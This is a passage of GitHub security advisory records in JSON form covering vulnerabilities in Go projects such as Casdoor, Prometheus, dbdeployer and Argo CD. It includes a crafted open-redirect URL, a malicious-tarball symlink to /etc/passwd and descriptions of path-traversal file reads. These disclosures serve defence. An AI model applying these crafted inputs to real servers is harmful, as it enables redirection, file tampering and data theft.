a SQL injection vulnerability related to the field and value parameters, as demonstrated by api/get-organizations.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/casdoor/casdoor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.13.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24124"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/issues/439"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/pull/442"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/commit/5ec0c7a89005819960d8fe07f5ddda13d1371b8c"}, {"type": "PACKAGE", "url": "https://github.com/casdoor/casdoor"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/compare/v1.13.0...v1.13.1"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/166163/Casdoor-1.13.0-SQL-Injection.html"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-01-31T22:12:48Z", "nvd_published_at": "2022-01-29T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6978-vg2j-cc9q", "modified": "2021-10-20T17:38:18Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-2023"], "summary": "Improper Privilege Management and Execution with Unnecessary Privileges in Kata Containers", "details": "Kata Containers doesn't restrict containers from accessing the guest's root filesystem device. Malicious containers can exploit this to gain code execution on the guest and masquerade as the kata-agent. This issue affects Kata Containers 1.11 versions earlier than 1.11.1; Kata Containers 1.10 versions earlier than 1.10.5; and Kata Containers 1.9 and earlier versions.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kata-containers/agent"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.9"}}, {"package": {"ecosystem": "Go", "name": "github.com/kata-containers/agent"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kata-containers/agent"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kata-containers/runtime"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.9"}}, {"package": {"ecosystem": "Go", "name": "github.com/kata-containers/runtime"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kata-containers/runtime"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-2023"}, {"type": "WEB", "url": "https://github.com/kata-containers/agent/issues/791"}, {"type": "WEB", "url": "https://github.com/kata-containers/runtime/issues/2488"}, {"type": "WEB", "url": "https://github.com/kata-containers/agent/pull/792"}, {"type": "WEB", "url": "https://github.com/kata-containers/runtime/pull/2477"}, {"type": "WEB", "url": "https://github.com/kata-containers/runtime/pull/2487"}, {"type": "PACKAGE", "url": "https://github.com/kata-containers"}, {"type": "WEB", "url": "https://github.com/kata-containers/runtime/releases/tag/1.10.5"}, {"type": "WEB", "url": "https://github.com/kata-containers/runtime/releases/tag/1.11.1"}], "database_specific": {"cwe_ids": ["CWE-250", "CWE-269"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-13T19:41:22Z", "nvd_published_at": "2020-06-10T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mpq4-rjj8-fjph", "modified": "2022-03-07T13:42:34Z", "published": "2022-02-26T00:00:44Z", "aliases": ["CVE-2022-25326"], "summary": "Uncontrolled Resource Consumption in github.com/google/fscrypt", "details": "fscrypt through v0.3.2 creates a world-writable directory by default when setting up a filesystem, allowing unprivileged users to exhaust filesystem space. We recommend upgrading to fscrypt 0.3.3 or above and adjusting the permissions on existing fscrypt metadata directories where applicable.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/fscrypt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25326"}, {"type": "WEB", "url": "https://github.com/google/fscrypt/pull/346"}, {"type": "WEB", "url": "https://github.com/google/fscrypt/commit/91aa3ebf42032ca783c41f9ec25d885875f66ddb"}, {"type": "PACKAGE", "url": "https://github.com/google/fscrypt/"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-01T19:25:48Z", "nvd_published_at": "2022-02-25T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g622-r636-qfqh", "modified": "2021-05-17T16:33:43Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2019-9039"], "summary": "SQL Injection in Couchbase Sync Gateway", "details": "The Couchbase Sync Gateway 2.1.2 in combination with a Couchbase Server is affected by a previously undisclosed N1QL-injection vulnerability in the REST API. An attacker with access to the public REST API can insert additional N1QL statements through the parameters ?startkey? and ?endkey? of the ?_all_docs? endpoint.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/couchbase/sync_gateway"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.5.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-9039"}, {"type": "WEB", "url": "https://github.com/couchbase/sync_gateway/commit/97adb5b496aa96aa70398018ea96da913ffd8d8c"}, {"type": "WEB", "url": "https://docs.couchbase.com/sync-gateway/2.5/release-notes.html"}, {"type": "WEB", "url": "https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/"}, {"type": "WEB", "url": "https://www.couchbase.com/resources/security#SecurityAlerts"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-17T16:33:43Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-99cg-575x-774p", "modified": "2023-08-29T20:29:19Z", "published": "2022-02-01T00:43:17Z", "aliases": ["CVE-2022-0317"], "summary": "Go-Attestation Improper Input Validation with attacker-controlled TPM Quote", "details": "### Impact\n\nAn improper input validation vulnerability in go-attestation before 0.4.0 allows local users to provide a maliciously-formed Quote over no/some PCRs, causing `AKPublic.Verify` to succeed despite the inconsistency. Subsequent use of the same set of PCR values in `Eventlog.Verify` lacks the authentication performed by quote verification, meaning a local attacker could couple this vulnerability with a maliciously-crafted TCG log in `Eventlog.Verify` to spoof events in the TCG log, hence defeating remotely-attested measured-boot.\n\n### Patches\nThis issue is resolved in version 0.4.0. If your usage of this library verifies PCRs using multiple quotes, make sure to use the new method `AKPublic.VerifyAll()` instead of `AKPublic.Verify`.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/go-attestation"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/go-attestation/security/advisories/GHSA-99cg-575x-774p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0317"}, {"type": "WEB", "url": "https://github.com/google/go-attestation/commit/82f2c9c2c76e1d3691d17ee78116d1d93a123788"}, {"type": "PACKAGE", "url": "https://github.com/google/go-attestation/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0294"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-01-31T22:15:30Z", "nvd_published_at": "2022-02-04T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5gjm-fj42-x983", "modified": "2023-09-15T18:11:15Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2018-1098"], "summary": "etcd Cross-site Request Forgery (CSRF)", "details": "A cross-site request forgery flaw was found in etcd 3.3.1 and earlier. An attacker can set up a website that tries to send a POST request to the etcd server and modify a key. Adding a key is done with PUT so it is theoretically safe (can't PUT from an HTML form or such) but POST allows creating in-order keys that an attacker can send.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.4.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1098"}, {"type": "WEB", "url": "https://github.com/coreos/etcd/issues/9353"}, {"type": "WEB", "url": "https://github.com/coreos/etcd/commit/a7e5790c82039945639798ae9a3289fe787f5e56"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1552714"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/JX7QTIT465BQGRGNCE74RATRQLKT2QE4/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UPGYHMSKDPW5GAMI7BEP3XQRVRLLBJKS/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/JX7QTIT465BQGRGNCE74RATRQLKT2QE4/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UPGYHMSKDPW5GAMI7BEP3XQRVRLLBJKS/"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T18:17:42Z", "nvd_published_at": "2018-04-03T16:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qmmc-jppf-32wv", "modified": "2021-05-20T21:02:14Z", "published": "2022-02-15T00:41:14Z", "aliases": ["CVE-2014-9358"], "summary": "Directory Traversal in Docker", "details": "Docker before 1.3.3 does not properly validate image IDs, which allows remote attackers to conduct path traversal attacks and spoof repositories via a crafted image in a (1) \"docker load\" operation or (2) \"registry communications.\"", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9358"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/cve-2014-9358"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!msg/docker-user/nFAz-B-n4Bw/0wr3wvLsnUwJ"}, {"type": "WEB", "url": "https://groups.google.com/forum/#%21msg/docker-user/nFAz-B-n4Bw/0wr3wvLsnUwJ"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9358"}, {"type": "WEB", "url": "http://www.securityfocus.com/archive/1/534215/100/0/threaded"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T21:02:14Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-g2qx-6ghw-67hm", "modified": "2021-05-20T22:20:34Z", "published": "2022-02-15T00:33:30Z", "aliases": ["CVE-2020-13246"], "summary": "Denial of Service in Gitea", "details": "An issue was discovered in Gitea in which an attacker can trigger a deadlock by initiating a transfer of a repository's ownership from one organization to another.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-gitea/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-13246"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/issues/10549"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/11438"}, {"type": "WEB", "url": "https://www.youtube.com/watch?v=DmVgADSVS88"}], "database_specific": {"cwe_ids": ["CWE-667"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T22:20:34Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-h289-x5wc-xcv8", "modified": "2022-02-16T22:56:21Z", "published": "2022-02-16T22:56:21Z", "aliases": [], "summary": "Improper Validation of Certificate with Host Mismatch in mellium.im/xmpp/websocket", "details": "### Impact\n\nIf no TLS configuration is provided by the user, the websocket package constructs its own TLS configuration using recommended defaults. When looking up a WSS endpoint using the DNS TXT record method described in [XEP-0156: Discovering Alternative XMPP Connection Methods](https://xmpp.org/extensions/xep-0156.html) the ServerName field was incorrectly being set to the name of the server returned by the TXT record request, not the name of the initial server we were attempting to connect to. This means that any attacker that can spoof a DNS record (ie. in the absence of DNSSEC, DNS-over-TLS, DNS-over-HTTPS, or similar technologies) could redirect the user to a server of their choosing and as long as it had a valid TLS certificate for itself the connection would succeed, resulting in a MITM situation.\n\n### Patches\n\nAll users should upgrade to v0.21.1.\n\n### Workarounds\n\nTo work around the issue, manually specify a TLS configuration with the correct hostname.\n\n### References\n\n- https://mellium.im/cve/cve-2022-24968/\n- https://nvd.nist.gov/vuln/detail/CVE-2022-24968\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Reach out on XMPP to [sam@samwhited.com](xmpp:sam@samwhited.com?msg)\n* Email us at [sam@samwhited.com](mailto:sam@samwhited.com)\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "mellium.im/xmpp"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.18.0"}, {"fixed": "0.21.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/mellium/xmpp/security/advisories/GHSA-h289-x5wc-xcv8"}, {"type": "WEB", "url": "https://github.com/mellium/xmpp/pull/260"}, {"type": "WEB", "url": "https://github.com/mellium/xmpp/commit/0d92aa486da69b71f2f4a30e62aa722c711b98ac"}, {"type": "WEB", "url": "https://mellium.im/cve/cve-2022-24968/"}, {"type": "WEB", "url": "https://mellium.im/issue/259"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0370"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-02-16T22:56:21Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-vx57-7f4q-fpc7", "modified": "2021-05-28T22:05:12Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2021-29622"], "summary": "Arbitrary redirects under /new endpoint", "details": "### Impact\n\nIn 2.23.0, Prometheus changed its default UI to the New ui. To ensure a seamless transition, the URL's prefixed by /new redirect to /.\nDue to a bug in the code, it is possible for an attacker to craft an URL that can redirect to any other URL, in the /new endpoint.\n\nIf a user visits a prometheus server with a specially crafted address (e.g.: `http://127.0.0.1:9090/new/new<url>`), they can be redirected to an arbitrary URL.\n\ne.g. if a user visits http://127.0.0.1:9090/new/newhttp://www.google.com/, they will be redirected to http://google.com.\n\n### Patches\n\nThe issue will be patched in 2.26.1 and 2.27.1 releases.\nIn 2.28.0, the /new endpoint will be removed completely.\n\n### Workarounds\n\nThe workaround is to disable access to /new via a reverse proxy in front of Prometheus.\n\nNote: Users who use a `--web.external-url=` flag _with a path_ (e.g.  `--web.external-url=http://example.com/prometheus`) are not affected.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please use our community channels (https://prometheus.io/community).\nOur security policy is available at https://prometheus.io/docs/operating/security/\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/prometheus/prometheus"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.23.0"}, {"fixed": "2.26.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/prometheus/prometheus"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.27.0"}, {"fixed": "2.27.1"}]}], "versions": ["2.27.0"]}], "references": [{"type": "WEB", "url": "https://github.com/prometheus/prometheus/security/advisories/GHSA-vx57-7f4q-fpc7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-29622"}, {"type": "WEB", "url": "https://github.com/prometheus/prometheus/releases/tag/v2.26.1"}, {"type": "WEB", "url": "https://github.com/prometheus/prometheus/releases/tag/v2.27.1"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-19T17:58:51Z", "nvd_published_at": "2021-05-19T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-47wr-426j-fr82", "modified": "2021-05-21T18:35:39Z", "published": "2022-02-12T00:14:07Z", "aliases": ["CVE-2020-26277"], "summary": "Symbolic links in an unpacking routine may enable attackers to read and/or write to arbitrary locations in dbdeployer", "details": "### Impact\n_Users unpacking a tarball through dbdeployer may use a maliciously packaged tarball that contains symlinks to files external to the target. In such scenario, an attacker could induce dbdeployer to write into a system file, thus altering the computer defences._\n\n### Mitigating factors\nFor the attach to succeed, the following factors need to contribute:\n\n* The user is logged in as root. While dbdeployer is usable as root, it was designed to run as unprivileged user.\n*  The user has taken a tarball from a non secure source, without testing the checksum. When the tarball is retrieved through dbdeployer, the checksum is compared before attempting to unpack.\n\n### Analysis\n\nAn attacker could inject a symbolic link into the tarball, so that a file could result into `fake_file -> /etc/passwd` or some equally  important file.\nAs it is now, dbdeployer would create the symlink as defined, with a local file `fake_file` linked to `/etc/passwd`. The danger here is that any process with the privileges to write to both `fake_file` and `/etc/passwd` could overwrite the system file. Even without malicious intent, this could result in the system to become unusable.\nAs noted above, the user must have write privileges to the target file to do the damage.\n\n### Remedies\n\nIt has been suggested that the extract procedure use `filepath.EvalSymlinks` to determine whether the target is within the extraction directory. Unfortunately, this approach is unavailable in this context, because it would prevent legitimate patterns from being carried out.\nA simple case is a file `mysql-8.0.22-macos10.15-x86_64/bin/libprotobuf-lite.3.11.4.dylib` with a linkName `../lib/libprotobuf-lite.3.11.4.dylib`, if the linked file has not been created yet, `filepath.EvalSymlinks` would fail, as it acts on existing files only.\n\nAn alternative method is comparing the depth (how many directories) of the file name with the depth of the link name. If the link name has a higher depth than the local file, we block the operation with an appropriate error:\n\n```\nUnpacking tarball exploit/mysql-8.0.22-macos10.15-x86_64.tar.gz to $HOME/opt/mysql/test8.0.22\n......\nlink '../../../../../../../../../../etc' points outside target directory\n\nexit status 1\n```\nAs an additional fortifier, we can check whether the link points to an existing file, calculate its absolute name, and compare it with the absolute name of the extraction directory. A link to a full path (such as `/etc/passwd`) would fail this test, and trigger an error.\n\nThe same check can be applied to a link to a non existing file with absolute path.\n\n### Patches\n\nPatched in release 1.58.2\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [dbdeployer](https://github.com/datacharmer/dbdeployer)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/datacharmer/dbdeployer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.58.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/datacharmer/dbdeployer/security/advisories/GHSA-47wr-426j-fr82"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26277"}, {"type": "WEB", "url": "https://github.com/datacharmer/dbdeployer/commit/548e256c1de2f99746e861454e7714ec6bc9bb10"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T18:35:39Z", "nvd_published_at": "2020-12-21T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jqmc-79gx-7g8p", "modified": "2022-02-23T22:00:51Z", "published": "2022-02-11T00:00:54Z", "aliases": ["CVE-2022-0532"], "summary": "Incorrect Permission Assignment for Critical Resource in CRI-O", "details": "An incorrect sysctls validation vulnerability was found in CRI-O 1.18 and earlier. The sysctls from the list of \"safe\" sysctls specified for the cluster will be applied to the host if an attacker is able to create a pod with a hostIPC and hostNetwork kernel namespace.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.23.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0532"}, {"type": "WEB", "url": "https://github.com/cri-o/cri-o/pull/5610"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2051730"}, {"type": "PACKAGE", "url": "https://github.com/cri-o/cri-o"}, {"type": "WEB", "url": "https://github.com/cri-o/cri-o/releases/tag/v1.23.1"}, {"type": "WEB", "url": "https://kubernetes.io/docs/tasks/administer-cluster/sysctl-cluster/#enabling-unsafe-sysctls"}], "database_specific": {"cwe_ids": ["CWE-732"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-02-11T18:50:08Z", "nvd_published_at": "2022-02-09T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-63qx-x74g-jcr7", "modified": "2022-02-07T19:06:18Z", "published": "2022-02-07T19:06:18Z", "aliases": ["CVE-2022-24348"], "summary": "Path traversal and dereference of symlinks in Argo CD", "details": "### Impact\n\nAll versions of Argo CD are vulnerable to a path traversal bug that allows to pass arbitrary values files to be consumed by Helm charts. \n\nAdditionally, it is possible to craft special Helm chart packages containing value files that are actually symbolic links, pointing to arbitrary files outside the repository's root directory.\n\nIf an attacker with permissions to create or update Applications knows or can guess the full path to a file containing valid YAML, they can create a malicious Helm chart to consume that YAML as values files, thereby gaining access to data they would otherwise have no access to. \n\nThe impact can especially become critical in environments that make use of encrypted value files (e.g. using plugins with git-crypt or SOPS) containing sensitive or confidential data, and decrypt these secrets to disk before rendering the Helm chart.\n\nAlso, because any error message from `helm template` is passed back to the user, and these error messages are quite verbose, enumeration of files on the repository server's file system is possible.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.3.0\n* v2.2.4\n* v2.1.9\n\nWe urge users of Argo CD to update their installation to one of the fixed versions as listed above.\n\n### Workarounds\n\nNo workaround for this issue.\n\n### References\n\n* https://apiiro.com/blog/malicious-kubernetes-helm-charts-can-be-used-to-steal-sensitive-information-from-argo-cd-deployments\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24348\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel `#argo-cd`\n\n### Credits\n\nThe path traversal vulnerability was discovered and reported by Moshe Zioni, VP Security Research, [Apiiro](https://www.apiiro.com). \n\nDuring the development of a fix for the path traversal vulnerability, the Argo CD team discovered the related issue with symbolic links.\n\nThe Argo CD team would like to thank Moshe Zioni for the responsible disclosure, and the constructive discussions during handling this issue!\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24348"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/78c2084f0febd159039ff785ddc2bd4ba1cecf88"}, {"type": "WEB", "url": "https://apiiro.com/blog/malicious-kubernetes-helm-charts-can-be-used-to-steal-sensitive-information-from-argo-cd-deployments/"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.1.9"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.2.4"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-03T22:53:47Z", "nvd_published_at": "2022-02-04T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8vwm-8vj8-rqjf", "modified": "2022-03-01T19:27:43Z", "published": "2022-02-26T00:00:44Z", "aliases": ["CVE-2022-25327"], "summary": "User login denial of service in github.com/google/fscrypt", "details": "The PAM module for fscrypt doesn't adequately validate fscrypt metadata files, allowing users to create malicious metadata files that prevent other users from logging in. A local user can cause a denial of service by creating a fscrypt metadata file that prevents other users from logging into the system. We recommend upgrading to version 0.3.3 or above", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/fscrypt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25327"}, {"type": "WEB", "url": "https://github.com/google/fscrypt/pull/346"}, {"type": "WEB", "url": "https://github.com/google/fscrypt/commit/91aa3ebf42032ca783c41f9ec25d885875f66ddb"}, {"type": "PACKAGE", "url": "https://github.com/google/fscrypt"}], "database_specific": {"cwe_ids": ["CWE-276"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-01T19:27:43Z", "nvd_published_at": "2022-02-25T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6hv3-7c34-4hx8", "modified": "2023-04-17T19:21:09Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2019-14802"], "summary": "Hashicorp Nomad Information Exposure Through Environmental Variables", "details": "In Nomad before version 0.9.5, when rendering a task template, all environment variables were available to the rendering task.  As a fix, only task environment variables are used.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-14802"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/pull/6055"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/commit/e8238305ef0b9ef37be3efd86a8d34bfbed5f63f"}, {"type": "WEB", "url": "https://advisories.gitlab.com/advisory/advgo_github_com_hashicorp_nomad_client_allocrunner_taskrunner_template_GMS_2022_818.html"}, {"type": "WEB", "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14802"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/releases/tag/v0.9.5"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/nomad"}], "database_specific": {"cwe_ids": ["CWE-526"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T17:59:46Z", "nvd_published_at": "2022-12-26T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qhm4-jxv7-j9pq", "modified": "2023-01-27T21:42:48Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-8551"], "summary": "Allocation of Resources Without Limits or Throttling and Uncontrolled Memory Allocation in Kubernetes", "details": "The Kubelet component in versions 1.15.0-1.15.9, 1.16.0-1.16.6, and 1.17.0-1.17.2 has been found to be vulnerable to a denial of service attack via the kubelet API, including the unauthenticated HTTP read-only API typically served on port 10255, and the authenticated HTTPS API typically served on port 10250.", "severity": [{"type": "CVSS_V3", "score": 